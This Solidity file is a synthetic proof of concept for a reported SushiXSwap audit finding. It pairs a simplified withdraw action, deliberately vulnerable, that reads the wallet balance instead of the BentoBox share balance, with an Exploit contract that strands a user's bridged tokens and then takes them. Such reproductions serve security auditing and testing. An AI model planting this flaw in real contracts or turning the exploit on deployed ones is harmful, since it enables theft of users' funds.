// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  SushiXSwap — ACTION_DST_WITHDRAW_FROM_BENTOBOX reads the wallet balance
    (Sigma Prime, finding #19616).
    SYNTHETIC, cheatcode-free. When amount is 0 the cook path assigns
    IERC20(token).balanceOf(address(this)) instead of the BentoBox share
    balance. Both amount and shares stay 0, so the bridged shares sit on
    SushiXSwap and anyone can withdraw them by passing the real amount.
    The assignment is the expression still used by ACTION_DST_DEPOSIT_TO_BENTOBOX
    in sushiswap/sushixswap contracts/SushiXSwap.sol, applied to the withdraw
    action the review names. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract BentoBox {
    mapping(address => mapping(address => uint256)) public balanceOf;

    function credit(address token, address to, uint256 amount) external {
        Asset(token).mint(address(this), amount);
        balanceOf[token][to] += amount;
    }

    function withdraw(address token, address from, address to, uint256 amount, uint256 shares) external {
        uint256 pay = shares > 0 ? shares : amount;
        require(balanceOf[token][from] >= pay, "box");
        balanceOf[token][from] -= pay;
        require(Asset(token).transfer(to, pay), "out");
    }
}

contract SushiXSwap {
    uint8 public constant ACTION_DST_WITHDRAW_FROM_BENTOBOX = 5;
    BentoBox public bento;
    uint256 public lastAmount;
    uint256 public lastShares;

    constructor(BentoBox bento_) {
        bento = bento_;
    }

    function cook(uint8 action, bytes calldata data) external virtual {
        if (action == ACTION_DST_WITHDRAW_FROM_BENTOBOX) {
            (address token, address to, uint256 amount, uint256 shares) =
                abi.decode(data, (address, address, uint256, uint256));
            if (amount == 0) {
                // @> VULN: wallet balance, not bento.balanceOf(token, address(this))
                amount = Asset(token).balanceOf(address(this));
            }
            lastAmount = amount;
            lastShares = shares;
            bento.withdraw(token, address(this), to, amount, shares);
        }
    }
}

contract Exploit {
    Asset public token;
    BentoBox public bento;
    SushiXSwap public swap;
    address public victim;

    constructor() {
        token = new Asset();
        bento = new BentoBox();
        swap = new SushiXSwap(bento);
        victim = address(0xBEEF);
    }

    function run() external {
        bento.credit(address(token), address(swap), 1000);
        bytes memory sweep = abi.encode(address(token), victim, uint256(0), uint256(0));
        swap.cook(swap.ACTION_DST_WITHDRAW_FROM_BENTOBOX(), sweep);
        require(swap.lastAmount() == 0, "shortcut stayed 0");
        require(token.balanceOf(victim) == 0, "user got nothing");
        require(bento.balanceOf(address(token), address(swap)) == 1000, "shares stuck");
        bytes memory steal = abi.encode(address(token), address(this), uint256(1000), uint256(0));
        swap.cook(swap.ACTION_DST_WITHDRAW_FROM_BENTOBOX(), steal);
        require(token.balanceOf(address(this)) == 1000, "attacker took the bridge");
        require(bento.balanceOf(address(token), address(swap)) == 0, "box empty");
    }
}
